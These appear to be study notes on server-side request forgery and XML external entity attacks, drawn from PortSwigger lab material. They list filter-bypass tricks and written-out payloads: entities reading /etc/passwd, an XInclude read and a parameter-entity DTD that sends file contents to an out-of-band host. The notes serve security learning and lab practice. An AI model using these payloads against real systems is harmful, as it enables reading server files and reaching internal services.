# Ch12: SSRF & XXE — Server-Side Data Access

Sources: `/web-security/ssrf` + `/web-security/ssrf/blind`, `/web-security/xxe` + `/web-security/xxe/blind`. Both abuse the server's *trusted network position* or its parser to reach things the attacker can't touch directly.

## SSRF — mechanism & common attacks

Server fetches a user-supplied URL (stock check, webhooks, PDF/image import, URL preview). Attacker controls the destination:

- **Against the server itself**: `http://127.0.0.1/admin`, `localhost`, `0.0.0.0` → admin panels bound to loopback.
- **Against other back-ends**: internal IPs (`192.168.0.x`, `10.x`, `172.16-31.x`, `169.254.169.254` cloud metadata), port-scan by response/timing deltas, internal-only hostnames.
- **Hidden attack surface**: partial URLs (`/path` joined to an internal base), URLs inside data formats (XML entities, JSON fields, `Referer` header — analytics bots fetch referrers), webhook/push callbacks.

### Filter bypasses (the canonical catalog)

- **Blacklist evasion**: `127.1`, `127.0.1`, decimal (`2130706433`), hex (`0x7f000001`), octal, `127.0.0.1.nip.io`/`sslip.io`, URL-casing, `http://[::1]`, `file://`/`gopher://`/`dict://` alternative schemes.
- **Whitelist evasion**: `expected@evil` (userinfo), `evil#expected`, `evil?expected`, `expected.evil.com`, `evil-expected.com`, double-encoded/double-parsed chars.
- **Open redirect bypass**: whitelist holds the *initial* URL — find an on-site open redirect that forwards to the internal target (`/redirect?url=http://192.168.0.68/admin`). The filter validates your URL, not where it lands.
- **DNS rebinding** (beyond labs): domain that resolves to public then internal IP.

### Blind SSRF

No response returned — detect via OOB (Collaborator/interactsh): HTTP or even DNS-only interaction proves the fetch. Impact paths: scan internal surface via timing deltas, exploit HTTP→internal-service deserialization (`gopher`-style) — prove minimal reachability for the report.

## XXE — mechanism & attacks

XML parser resolves attacker-defined entities. Entry points: any XML body, and **hidden surfaces** — `Content-Type: application/xml` swaps on JSON endpoints, SOAP/XML-RPC, file uploads parsed as XML (`.docx`/`.xlsx`/`.svg`), XInclude in partial templates.

- **File retrieval**: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` then reference `&xxe;` in an echoed field.
- **SSRF via XXE**: `<!ENTITY xxe SYSTEM "http://internal/">` — reaches the same internal surface as SSRF from inside the parser.
- **Blind XXE** (no entity reflection):
  - OOB entity: `<!ENTITY % xxe SYSTEM "http://COLLAB/">` → DNS/HTTP hit proves parsing.
  - Error-based: external DTD that loads a nonexistent file containing the target data → parser error message carries the content.
  - Parameter-entity DTD: host `evil.dtd` with `<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://COLLAB/?x=%file;'>">` → data rides out in the OOB request.
- **XInclude**: when you can't inject DOCTYPE (partial XML inside a doc), `<xi:include href="file:///etc/passwd" parse="text"/>` under the `xi` namespace.
- **File-upload XXE**: `.svg` avatar (inline XML), `.docx` (edit `word/document.xml`), `.xlsx` — parser on the server resolves entities during processing.

## Lab reference

`https://portswigger.net/web-security/all-labs#server-side-request-forgery-ssrf` · `#xml-external-entity-xxe-injection`
